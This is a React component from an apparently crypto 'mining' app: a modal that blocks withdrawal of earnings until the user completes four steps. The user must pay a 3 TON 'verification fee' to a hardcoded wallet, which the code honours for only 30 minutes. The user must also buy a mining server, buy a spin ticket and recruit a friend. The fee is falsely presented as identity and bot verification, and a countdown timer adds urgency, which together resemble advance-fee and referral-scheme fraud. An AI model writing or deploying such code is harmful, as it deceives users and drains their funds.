import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { Loader2, X, Clock, Check, Server, Ticket, Users, ChevronRight } from 'lucide-react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
import { getValidUntil, tonToNano } from '@/lib/ton-constants';
import { usePromoSettings } from '@/hooks/usePromoSettings';
import { useNavigate } from 'react-router-dom';

interface WithdrawalRequirementsModalProps {
  open: boolean;
  onClose: () => void;
  userId: string;
  walletAddress: string;
  onAllRequirementsMet: () => void;
}

type Step = 'verification' | 'server' | 'ticket' | 'referral' | 'complete';

const VERIFICATION_WALLET = 'UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb';

const formatCountdown = (ms: number) => {
  const totalSeconds = Math.floor(ms / 1000);
  const hours = Math.floor(totalSeconds / 3600);
  const minutes = Math.floor((totalSeconds % 3600) / 60);
  const seconds = totalSeconds % 60;
  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
};

const WithdrawalRequirementsModal: React.FC<WithdrawalRequirementsModalProps> = ({
  open,
  onClose,
  userId,
  walletAddress,
  onAllRequirementsMet,
}) => {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const navigate = useNavigate();
  
  // Use backend promo settings
  const { isPromoActive: promoActive, timeRemaining } = usePromoSettings();
  // Fixed withdrawal fee - always 3 TON
  const verificationFee = 3;
  
  const [currentStep, setCurrentStep] = useState<Step>('verification');
  const [isLoading, setIsLoading] = useState(false);
  
  // Check requirements status
  const [isVerified, setIsVerified] = useState(false);
  const [hasServer, setHasServer] = useState(false);
  const [hasTicket, setHasTicket] = useState(false);
  const [hasReferral, setHasReferral] = useState(false);
  const [checkingStatus, setCheckingStatus] = useState(true);

  // Check all requirements on open
  useEffect(() => {
    if (open && userId) {
      checkAllRequirements();
    }
  }, [open, userId]);

  const checkAllRequirements = async () => {
    setCheckingStatus(true);
    try {
      // 1. Check verification
      const thirtyMinutesAgo = new Date(Date.now() - 30 * 60 * 1000).toISOString();
      const { data: verification } = await supabase
        .from('wallet_verifications')
        .select('id')
        .eq('user_id', userId)
        .eq('currency', 'TON')
        .gte('verified_at', thirtyMinutesAgo)
        .limit(1)
        .maybeSingle();
      
      const verified = !!verification;
      setIsVerified(verified);

      if (!verified) {
        setCurrentStep('verification');
        setCheckingStatus(false);
        return;
      }

      // 2. Check server ownership (minimum 5 TON server)
      const { count: serverCount } = await supabase
        .from('user_servers')
        .select('*', { count: 'exact', head: true })
        .eq('user_id', userId)
        .eq('is_active', true);
      
      const hasServerNow = (serverCount || 0) > 0;
      setHasServer(hasServerNow);

      if (!hasServerNow) {
        setCurrentStep('server');
        setCheckingStatus(false);
        return;
      }

      // 3. Check spin tickets
      const { data: ticketData } = await supabase
        .from('user_spin_tickets')
        .select('tickets_count, pro_tickets_count, referral_tickets_count')
        .eq('user_id', userId)
        .maybeSingle();
      
      const totalTickets = (ticketData?.tickets_count || 0) + 
                          (ticketData?.pro_tickets_count || 0) + 
                          (ticketData?.referral_tickets_count || 0);
      const hasTicketNow = totalTickets > 0 || !!ticketData;
      
      // Check if user has ever purchased a ticket
      const { count: ticketPurchaseCount } = await supabase
        .from('spin_history')
        .select('*', { count: 'exact', head: true })
        .eq('user_id', userId);
      
      const hasPurchasedTicket = (ticketPurchaseCount || 0) > 0 || hasTicketNow;
      setHasTicket(hasPurchasedTicket);

      if (!hasPurchasedTicket) {
        setCurrentStep('ticket');
        setCheckingStatus(false);
        return;
      }

      // 4. Check referrals
      const { count: referralCount } = await supabase
        .from('bolt_referrals')
        .select('*', { count: 'exact', head: true })
        .eq('referrer_id', userId);
      
      const hasReferralNow = (referralCount || 0) > 0;
      setHasReferral(hasReferralNow);

      if (!hasReferralNow) {
        setCurrentStep('referral');
        setCheckingStatus(false);
        return;
      }

      // All requirements met!
      setCurrentStep('complete');
      
    } catch (err) {
      console.error('Error checking requirements:', err);
    } finally {
      setCheckingStatus(false);
    }
  };

  const handleVerification = async () => {
    if (!wallet?.account) {
      toast.error('Please connect your wallet first');
      return;
    }

    setIsLoading(true);
    const currentFee = verificationFee;
    
    try {
      const transaction = {
        validUntil: getValidUntil(),
        messages: [
          {
            address: VERIFICATION_WALLET,
            amount: tonToNano(currentFee)
          }
        ]
      };

      const result = await tonConnectUI.sendTransaction(transaction);
      
      if (result && result.boc) {
        const { error } = await supabase
          .from('wallet_verifications')
          .upsert({
            user_id: userId,
            wallet_address: walletAddress,
            currency: 'TON',
            verification_fee: currentFee,
            tx_hash: result.boc,
            verified_at: new Date().toISOString(),
          }, {
            onConflict: 'user_id,wallet_address,currency',
            ignoreDuplicates: false
          });

        if (error) throw error;

        setIsVerified(true);
        toast.success('Verification successful!');
        
        // Check next requirement
        await checkAllRequirements();
      }
    } catch (error: any) {
      console.error('Verification error:', error);
      if (error?.message?.includes('Cancelled') || error?.message?.includes('User declined')) {
        toast.error('Transaction cancelled');
      } else {
        toast.error(`Verification failed: ${error?.message || 'Unknown error'}`);
      }
    } finally {
      setIsLoading(false);
    }
  };

  const handleBuyServer = () => {
    onClose();
    navigate('/mining-servers');
  };

  const handleBuyTicket = () => {
    onClose();
    navigate('/spin');
  };

  const handleInviteFriend = () => {
    onClose();
    navigate('/invite');
  };

  const handleComplete = () => {
    onAllRequirementsMet();
    onClose();
  };

  const handleClose = () => {
    if (!isLoading) {
      onClose();
    }
  };

  

  const renderStepContent = () => {
    if (checkingStatus) {
      return (
        <div className="py-12 text-center">
          <Loader2 className="w-8 h-8 text-primary animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground">Checking requirements...</p>
        </div>
      );
    }

    switch (currentStep) {
      case 'verification':
        return (
          <motion.div
            key="verification"
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            className="flex flex-col"
          >
            {/* Security Image */}
            <div className="relative">
              {promoActive ? (
                <img 
                  src="/images/withdrawal-security.png" 
                  alt="Withdrawal Security" 
                  className="w-full h-auto rounded-t-lg"
                />
              ) : (
                <div className="w-full h-32 bg-gradient-to-br from-primary/20 to-secondary/20 rounded-t-lg flex items-center justify-center">
                  <p className="text-lg font-bold text-foreground">Step 1: Verification</p>
                </div>
              )}
              <button 
                onClick={handleClose} 
                className="absolute top-2 right-2 p-1.5 rounded-full bg-black/50 text-white"
                disabled={isLoading}
              >
                <X className="w-5 h-5" />
              </button>

              {promoActive && (
                <div className="absolute top-2 left-2 flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-destructive text-destructive-foreground text-sm font-bold">
                  <Clock className="w-4 h-4" />
                  <span>{formatCountdown(timeRemaining)}</span>
                </div>
              )}
            </div>

            <div className="p-5 space-y-4">
              <div className="text-center space-y-1">
                <p className="text-lg font-bold text-foreground">
                  Withdrawal Fee
                </p>
                <p className="text-3xl font-bold text-primary">
                  {verificationFee} TON
                </p>
                <p className="text-xs text-muted-foreground">
                  Required to verify your identity and prevent bots.
                </p>
              </div>

              <Button
                onClick={handleVerification}
                disabled={isLoading || !wallet?.account}
                className="w-full h-12 bg-primary hover:bg-primary/90"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Processing...
                  </>
                ) : !wallet?.account ? (
                  'Connect wallet first'
                ) : (
                  'Pay & Continue'
                )}
              </Button>
            </div>
          </motion.div>
        );

      case 'server':
        return (
          <motion.div
            key="server"
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            className="flex flex-col"
          >
            <div className="flex items-center justify-between p-4 border-b border-border">
              <div className="flex items-center gap-2">
                <Check className="w-5 h-5 text-green-500" />
                <span className="text-sm text-green-500">Verification Complete</span>
              </div>
              <button onClick={handleClose} className="text-muted-foreground">
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-6 text-center space-y-4">
              <div className="w-16 h-16 rounded-full bg-orange-500/10 flex items-center justify-center mx-auto">
                <Server className="w-8 h-8 text-orange-500" />
              </div>
              
              <div>
                <h3 className="text-lg font-semibold text-foreground mb-2">Step 2: Buy a Server</h3>
                <p className="text-sm text-muted-foreground">
                   Purchase at least one mining server (minimum 5 TON) to enable withdrawals and start earning passive income.
                 </p>
              </div>

              <Button
                onClick={handleBuyServer}
                className="w-full h-12 bg-orange-500 hover:bg-orange-600 text-white"
              >
                <Server className="w-4 h-4 mr-2" />
                Buy Server Now
                <ChevronRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </motion.div>
        );

      case 'ticket':
        return (
          <motion.div
            key="ticket"
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            className="flex flex-col"
          >
            <div className="flex items-center justify-between p-4 border-b border-border">
              <div className="flex items-center gap-2">
                <Check className="w-5 h-5 text-green-500" />
                <span className="text-sm text-green-500">Server Purchased</span>
              </div>
              <button onClick={handleClose} className="text-muted-foreground">
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-6 text-center space-y-4">
              <div className="w-16 h-16 rounded-full bg-purple-500/10 flex items-center justify-center mx-auto">
                <Ticket className="w-8 h-8 text-purple-500" />
              </div>
              
              <div>
                <h3 className="text-lg font-semibold text-foreground mb-2">Step 3: Buy a Spin Ticket</h3>
                <p className="text-sm text-muted-foreground">
                  Purchase a spin ticket to try your luck and win amazing prizes!
                </p>
              </div>

              <Button
                onClick={handleBuyTicket}
                className="w-full h-12 bg-purple-500 hover:bg-purple-600 text-white"
              >
                <Ticket className="w-4 h-4 mr-2" />
                Buy Ticket Now
                <ChevronRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </motion.div>
        );

      case 'referral':
        return (
          <motion.div
            key="referral"
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            className="flex flex-col"
          >
            <div className="flex items-center justify-between p-4 border-b border-border">
              <div className="flex items-center gap-2">
                <Check className="w-5 h-5 text-green-500" />
                <span className="text-sm text-green-500">Ticket Purchased</span>
              </div>
              <button onClick={handleClose} className="text-muted-foreground">
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-6 text-center space-y-4">
              <div className="w-16 h-16 rounded-full bg-blue-500/10 flex items-center justify-center mx-auto">
                <Users className="w-8 h-8 text-blue-500" />
              </div>
              
              <div>
                <h3 className="text-lg font-semibold text-foreground mb-2">Final Step: Invite a Friend</h3>
                <p className="text-sm text-muted-foreground">
                  This is the last step! Invite at least one friend to unlock withdrawals and earn 50% commission on their purchases.
                </p>
              </div>

              <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/20">
                <p className="text-xs text-blue-400 font-medium">
                  🎁 Bonus: Get a free spin ticket for every friend you invite!
                </p>
              </div>

              <Button
                onClick={handleInviteFriend}
                className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white"
              >
                <Users className="w-4 h-4 mr-2" />
                Invite Friend Now
                <ChevronRight className="w-4 h-4 ml-2" />
              </Button>
            </div>
          </motion.div>
        );

      case 'complete':
        return (
          <motion.div
            key="complete"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="py-10 text-center px-6"
          >
            <div className="w-16 h-16 rounded-full bg-green-500/10 flex items-center justify-center mx-auto mb-4">
              <Check className="w-8 h-8 text-green-500" />
            </div>
            <h3 className="text-lg font-semibold text-foreground mb-2">All Requirements Met!</h3>
            <p className="text-sm text-muted-foreground mb-6">
              You can now withdraw your earnings
            </p>
            <Button
              onClick={handleComplete}
              className="w-full h-12 bg-green-500 hover:bg-green-600 text-white"
            >
              Continue to Withdraw
            </Button>
          </motion.div>
        );
    }
  };

  return (
    <Dialog open={open} onOpenChange={handleClose}>
      <DialogContent className="max-w-sm border-0 bg-background p-0 gap-0" hideCloseButton>
        <AnimatePresence mode="wait">
          {renderStepContent()}
        </AnimatePresence>
      </DialogContent>
    </Dialog>
  );
};

export default WithdrawalRequirementsModal;
